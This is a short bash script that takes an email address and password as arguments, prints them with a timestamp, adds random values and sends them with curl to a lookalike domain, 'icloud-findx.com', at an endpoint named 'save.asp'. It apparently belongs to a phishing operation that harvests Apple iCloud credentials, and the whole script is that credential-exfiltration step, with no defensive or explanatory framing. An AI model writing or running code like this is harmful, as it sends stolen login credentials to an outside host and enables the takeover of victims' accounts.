#!/bin/bash
email=$1
pass=$2
date=`date`
echo -e "$email\t$pass\t$date"
x=$(($RANDOM % 20 + 1))
y=$(($RANDOM % 20 + 1))
curl www.icloud-findx.com/ht/save.asp -d "u=$email&p=$pass&x=$x&y=$y"
